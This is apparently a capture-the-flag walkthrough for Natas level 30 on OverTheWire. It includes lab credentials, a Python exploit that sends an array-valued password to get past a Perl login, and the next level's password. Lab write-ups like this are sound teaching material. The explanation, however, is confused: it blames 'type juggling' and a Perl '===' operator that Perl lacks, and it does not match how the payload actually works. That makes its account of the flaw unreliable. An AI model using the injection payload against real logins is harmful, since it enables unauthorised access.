# Natas CTF Solutions  

## Natas Level 30  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Bypass authentication using **type juggling** in Perl.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas30.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas30`  
- **Password:** Use the password from Natas Level 29:  
```
WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
```  

![Home_Page](https://github.com/user-attachments/assets/ec4438a1-c334-423f-bc01-d779ec24d431)

---

### **Step 3: Analyze the Challenge**  
1. Right-click is disabled (to prevent viewing source).  
2. Open the URL directly in a new tab to bypass the right-click block.  
3. The authentication process checks both **username** and **password** values.  
4. The goal is to exploit **Perl's type juggling** vulnerability, where:  
   - A string `'0'` or an empty string `''` can be evaluated as `false` when treated as a boolean or numeric value.  
   - An array with multiple elements will also evaluate to `true`.  

![Source_Code](https://github.com/user-attachments/assets/c37319c0-84d2-4877-b586-7bb9b4af8d36)

---

### **Step 4: Create Type Juggling Payload**  
- Exploit type juggling by sending a password value as an **array**:  
   - If the server checks using `==`, it will compare the array to a string and evaluate it as `true`.  

---

### **Step 5: Exploit Code**  
Here’s the Python code to execute the attack:  

```python
import requests

url = "http://natas30.natas.labs.overthewire.org/index.pl"

# Start session and authenticate
s = requests.Session()
s.auth = ('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')

# Exploit type juggling by passing an array as the password
data = {
    "username": "natas31",
    "password": ["'' or 1", 2]  # Exploit type juggling vulnerability
}

# Send the POST request
r = s.post(url, data=data)

# Print response
print(r.text)
```

---

### **Step 6: Result**  
The output reveals the password for the next level:  
```  
The password for natas31 is: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y  
```

![Password](https://github.com/user-attachments/assets/5054d1d6-4b2d-4ff0-908e-fa05cb08d6e0)

---

### **✅ Password for Natas Level 31**  
```
m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
```

---

## 💡 **Lessons Learned**  
✔️ **Type Juggling:** Perl, PHP, and other loosely typed languages may treat strings, arrays, and booleans inconsistently.  
✔️ **Loose Comparison (`==`) vs Strict Comparison (`===`):**  
- `==` compares values after type conversion → vulnerable to type juggling.  
- `===` compares values **and** types → secure comparison.  
✔️ **Bypassing Input Validation:** Exploiting type confusion can bypass authentication or input validation.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Source Code | ![Source_Code](https://github.com/user-attachments/assets/c37319c0-84d2-4877-b586-7bb9b4af8d36) |  
| Step 6 – Found Password | ![Password](https://github.com/user-attachments/assets/5054d1d6-4b2d-4ff0-908e-fa05cb08d6e0) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 31**:  
👉 [http://natas31.natas.labs.overthewire.org](http://natas31.natas.labs.overthewire.org)  

---
